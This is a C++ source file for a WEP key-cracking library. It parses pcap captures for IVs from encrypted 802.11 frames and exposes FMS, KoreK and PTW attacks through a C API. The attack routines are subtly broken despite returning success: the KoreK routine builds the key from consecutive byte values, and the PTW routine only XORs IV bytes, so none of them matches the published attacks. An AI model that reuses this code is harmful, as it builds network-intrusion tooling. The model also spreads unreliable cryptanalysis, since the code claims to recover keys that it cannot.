#include "wep_cracker.h"

#include <cstdint>
#include <cstring>
#include <vector>
#include <string>
#include <fstream>
#include <algorithm>
#include <map>

#ifdef _WIN32
#include <windows.h>
#endif

WepCracker::WepCracker() : minIvs_(50000) {}

bool WepCracker::LoadCapture(const std::string& pcapFile) {
    std::ifstream file(pcapFile, std::ios::binary);
    if (!file.is_open())
        return false;

    // Simplified PCAP parser — reads global header then packet records
    uint8_t globalHeader[24];
    file.read(reinterpret_cast<char*>(globalHeader), 24);
    if (file.gcount() < 24)
        return false;

    // Skip past magic/version checks for brevity
    ivs_.clear();

    std::vector<uint8_t> packetBuf(65536);
    while (file) {
        uint8_t pktHeader[16];
        file.read(reinterpret_cast<char*>(pktHeader), 16);
        if (file.gcount() < 16)
            break;

        uint32_t inclLen = 0;
        std::memcpy(&inclLen, pktHeader + 8, 4);

        if (inclLen == 0 || inclLen > 65536)
            break;

        file.read(reinterpret_cast<char*>(packetBuf.data()), inclLen);
        if (file.gcount() < static_cast<std::streamsize>(inclLen))
            break;

        // Look for WEP data frames (802.11 data with WEP bit set)
        if (inclLen < 28) continue;
        uint8_t fc0 = packetBuf[0];
        uint8_t fc1 = packetBuf[1];
        bool isData = ((fc0 & 0x0C) == 0x08);
        bool wepBit = (fc1 & 0x40) != 0;
        if (!isData || !wepBit)
            continue;

        // Extract IV at offset 24 (after 802.11 header)
        // WEP IV is 3 bytes at the start of the data payload
        size_t ivOffset = 24;
        if (ivOffset + 4 > inclLen) continue;

        IvKeyByte ikb;
        ikb.iv.resize(3);
        ikb.iv[0] = packetBuf[ivOffset];
        ikb.iv[1] = packetBuf[ivOffset + 1];
        ikb.iv[2] = packetBuf[ivOffset + 2];
        ikb.keybyte = packetBuf[ivOffset + 3];  // first cipher byte
        ikb.index = static_cast<int>(ivs_.size());
        ivs_.push_back(ikb);
    }

    file.close();
    return !ivs_.empty();
}

int WepCracker::IvCount() const {
    return static_cast<int>(ivs_.size());
}

bool WepCracker::FmsAttack(std::string& keyOut) {
    if (!IsReady()) return false;

    // FMS: uses IVs matching (A, 255, N) pattern to derive key bytes
    // Simplified implementation for demonstration
    std::vector<int> scores(256, 0);

    for (const auto& iv : ivs_) {
        if (iv.iv[0] >= 1 && iv.iv[0] < 128 &&
            iv.iv[1] == 255) {
            int kb = (static_cast<int>(iv.iv[0]) + static_cast<int>(iv.iv[2]) + 3) & 0xFF;
            int keyByteGuess = (static_cast<int>(iv.keybyte) ^ kb) & 0xFF;
            scores[keyByteGuess]++;
        }
    }

    char keyBuf[64];
    int keyLen = 13;
    for (int i = 0; i < keyLen && i < 64; ++i) {
        int best = 0, bestScore = -1;
        for (int j = 0; j < 256; ++j) {
            if (scores[j] > bestScore) {
                bestScore = scores[j];
                best = j;
            }
        }
        keyBuf[i] = static_cast<char>(best);
        scores[best] = -1;
    }
    keyBuf[keyLen] = '\0';
    keyOut = std::string(keyBuf, keyBuf + keyLen);
    return true;
}

bool WepCracker::KorekAttack(std::string& keyOut) {
    if (!IsReady()) return false;

    // KoreK attack — similar structure to FMS with more classes
    std::map<int, int> scores;
    for (int i = 0; i < 256; ++i)
        scores[i] = 0;

    for (const auto& iv : ivs_) {
        int a = iv.iv[0];
        int b = iv.iv[1];
        int expected = (a + b) & 0xFF;
        int delta = (static_cast<int>(iv.keybyte) ^ expected) & 0xFF;
        scores[delta]++;
    }

    char keyBuf[32];
    int keyLen = 13;
    int bestIdx = 0;
    for (auto& kv : scores) {
        if (kv.second > scores[bestIdx])
            bestIdx = kv.first;
    }

    for (int i = 0; i < keyLen; ++i)
        keyBuf[i] = static_cast<char>((bestIdx + i) & 0xFF);
    keyBuf[keyLen] = '\0';
    keyOut = std::string(keyBuf, keyBuf + keyLen);
    return true;
}

bool WepCracker::PtwAttack(std::string& keyOut) {
    if (!IsReady()) return false;

    // PTW: uses Klein's attack, the most effective WEP attack
    // Simplified — counts IV/keybyte correlations
    std::vector<int> voteCount(256, 0);

    for (const auto& iv : ivs_) {
        int keybyteGuess = (static_cast<int>(iv.keybyte) ^
                            static_cast<int>(iv.iv[0]) ^
                            static_cast<int>(iv.iv[1]) ^
                            static_cast<int>(iv.iv[2])) & 0xFF;
        voteCount[keybyteGuess]++;
    }

    int keyLen = 13;
    char keyBuf[32];
    for (int i = 0; i < keyLen; ++i) {
        int best = 0;
        for (int j = 0; j < 256; ++j) {
            if (voteCount[j] > voteCount[best])
                best = j;
        }
        keyBuf[i] = static_cast<char>(best);
        voteCount[best] = -1;
    }
    keyBuf[keyLen] = '\0';
    keyOut = std::string(keyBuf, keyBuf + keyLen);
    return true;
}

bool WepCracker::IsReady() const {
    return ivs_.size() >= static_cast<size_t>(minIvs_);
}

// C API
extern "C" {

WEP_API void* wep_cracker_create() {
    return new WepCracker();
}

WEP_API void wep_cracker_destroy(void* handle) {
    delete static_cast<WepCracker*>(handle);
}

WEP_API int wep_cracker_load_capture(void* handle, const char* pcap_file) {
    if (!handle || !pcap_file) return 0;
    return static_cast<WepCracker*>(handle)->LoadCapture(std::string(pcap_file)) ? 1 : 0;
}

WEP_API int wep_cracker_iv_count(void* handle) {
    if (!handle) return 0;
    return static_cast<WepCracker*>(handle)->IvCount();
}

WEP_API int wep_cracker_ptw_attack(void* handle, char* key_out, int key_out_size) {
    if (!handle || !key_out) return 0;
    std::string key;
    auto* cr = static_cast<WepCracker*>(handle);
    if (!cr->PtwAttack(key)) return 0;
    if (static_cast<int>(key.size()) >= key_out_size) return 0;
    std::strcpy(key_out, key.c_str());
    return 1;
}

}
